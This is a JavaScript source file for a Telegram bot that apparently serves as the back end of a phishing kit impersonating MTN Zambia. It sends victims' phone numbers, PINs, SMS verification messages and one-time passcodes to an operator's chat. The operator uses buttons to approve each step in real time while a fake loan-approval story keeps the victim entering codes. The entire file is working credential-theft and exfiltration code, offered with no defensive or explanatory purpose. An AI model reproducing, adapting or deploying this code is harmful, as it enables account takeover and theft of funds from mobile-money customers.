// telegram.js
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const db = require('./db');

const token = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

// IMPORTANT: polling is false because we are using webhooks on Render
const bot = new TelegramBot(token, { polling: false });

// 1. Send Initial Application
async function sendApplicationToTelegram(sessionId, data) {
    const timeNow = new Date().toLocaleString();
    const text = `📱 *MTN ZAMBIA - LOGIN ATTEMPT*\n\n` +
                 `🆕 NEW USER\n\n` +
                 `🌍 *Country Code :* +260\n` +
                 `📱 *Phone Number :* ${data.phone}\n\n` +
                 `⏰ *Time:* ${timeNow}\n\n` +
                 `⚠️ *User waiting for approval*`;

    const keyboard = {
        inline_keyboard: [[
            { text: "✅ Proceed", callback_data: `app_proceed_${sessionId}` },
            { text: "❌ Invalid", callback_data: `app_invalid_${sessionId}` }
        ]]
    };

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
}

// 2. Send PIN
async function sendPinToTelegram(sessionId, data) {
    const timeNow = new Date().toLocaleString();
    const text = `🔐 *MTN ZAMBIA - PIN VERIFICATION*\n\n` +
                 `🌍 *Country Code :* +260\n` +
                 `📱 *Phone Number :* ${data.phone}\n` +
                 `🔑 *PIN :* ${data.pin}\n\n` +
                 `⏰ *Time:* ${timeNow}`;

    const keyboard = {
        inline_keyboard: [
            [{ text: "✅ Correct PIN", callback_data: `pin_correct_${sessionId}` }],
            [{ text: "⚠️ Wrong PIN", callback_data: `pin_wrong_${sessionId}` }]
        ]
    };

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
}

// 3. Send Verification Message
async function sendVerificationToTelegram(sessionId, data) {
    const timeNow = new Date().toLocaleString();
    const text = `💬 *MTN ZAMBIA - VERIFICATION MESSAGE*\n\n` +
                 `🌍 *Country Code :* +260\n` +
                 `📱 *Phone Number :* ${data.phone}\n` +
                 `✉️ *Message :*\n${data.verificationMsg}\n\n` +
                 `⏰ *Time:* ${timeNow}`;

    const keyboard = {
        inline_keyboard: [
            [{ text: "✅ Correct Message", callback_data: `ver_correct_${sessionId}` }],
            [{ text: "⚠️ Wrong Message", callback_data: `ver_wrong_${sessionId}` }]
        ]
    };

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
}

// 4. Send OTP
async function sendOtpToTelegram(sessionId, data) {
    const timeNow = new Date().toLocaleString();
    const text = `🔢 *MTN ZAMBIA - OTP VERIFICATION*\n\n` +
                 `🌍 *Country Code :* +260\n` +
                 `📱 *Phone Number :* ${data.phone}\n` +
                 `🔢 *OTP :* ${data.otp}\n\n` +
                 `⏰ *Time:* ${timeNow}`;

    const keyboard = {
        inline_keyboard: [
            [{ text: "✅ Correct OTP (Finalize)", callback_data: `otp_correct_${sessionId}` }],
            [{ text: "⚠️ Wrong OTP", callback_data: `otp_wrong_${sessionId}` }]
        ]
    };

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
}

// Handle Button Clicks
bot.on('callback_query', async (query) => {
    const data = query.data;
    const messageId = query.message.message_id;
    const parts = data.split('_');
    const action = parts[0];
    const subAction = parts[1];
    const sessionId = parts.slice(2).join('_');

    let statusUpdate = null;
    let replyText = "Processed";
    let responseText = "";

    if (action === 'app') {
        if (subAction === 'proceed') {
            statusUpdate = 'APP_APPROVED';
            replyText = "✅ Approved";
            responseText = "✅ *ALLOWED*\n\n🌍 Country Code : +260\n📱 Phone Number : " + (db.getSession(sessionId)?.phone || "N/A") + "\n\n→ User will be asked for PIN";
        } else {
            statusUpdate = 'APP_REJECTED';
            replyText = "❌ Rejected";
            responseText = "❌ *INVALID APPLICATION*";
        }
    } else if (action === 'pin') {
        if (subAction === 'correct') {
            statusUpdate = 'PIN_SUCCESS';
            replyText = "✅ PIN Correct";
            responseText = "✅ *PIN OK — ASK VERIFICATION MESSAGE*\n\n🌍 Country Code : +260\n📱 Phone Number : " + (db.getSession(sessionId)?.phone || "N/A") + "\n🔑 PIN : " + (db.getSession(sessionId)?.pin || "N/A") + "\n\n→ User will be asked for verification message";
        } else {
            statusUpdate = 'WRONG_PIN';
            replyText = "⚠️ Wrong PIN";
            responseText = "⚠️ *WRONG PIN*";
        }
    } else if (action === 'ver') {
        if (subAction === 'correct') {
            statusUpdate = 'VERIFICATION_SUCCESS';
            replyText = "✅ Message Correct";
            responseText = "✅ *MESSAGE OK — ASK OTP*\n\n🌍 Country Code : +260\n📱 Phone Number : " + (db.getSession(sessionId)?.phone || "N/A") + "\n✉️ Message :\n" + (db.getSession(sessionId)?.verificationMsg || "N/A") + "\n\n→ User will be asked for OTP";
        } else {
            statusUpdate = 'WRONG_VERIFICATION';
            replyText = "⚠️ Wrong Message";
            responseText = "❌ *WRONG MESSAGE*";
        }
    } else if (action === 'otp') {
        if (subAction === 'correct') {
            statusUpdate = 'LOGIN_SUCCESS';
            replyText = "✅ Verified";
            responseText = "✅ *OTP OK — LOAN APPROVED*\n\n🌍 Country Code : +260\n📱 Phone Number : " + (db.getSession(sessionId)?.phone || "N/A") + "\n🔢 OTP : " + (db.getSession(sessionId)?.otp || "N/A") + "\n\n→ Loan successfully finalized!";
        } else {
            statusUpdate = 'WRONG_OTP';
            replyText = "⚠️ Wrong OTP";
            responseText = "❌ *WRONG OTP*";
        }
    }

    if (statusUpdate && db.getSession(sessionId)) {
        db.updateStatus(sessionId, statusUpdate);
        await bot.answerCallbackQuery(query.id, { text: replyText });

        try {
            await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
        } catch (e) {}

        await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
    } else {
        await bot.answerCallbackQuery(query.id, { text: "Error: Session expired." });
    }
});

// Export the bot so server.js can use it for webhooks
module.exports = { 
    bot, 
    sendApplicationToTelegram, 
    sendPinToTelegram, 
    sendVerificationToTelegram, 
    sendOtpToTelegram 
};
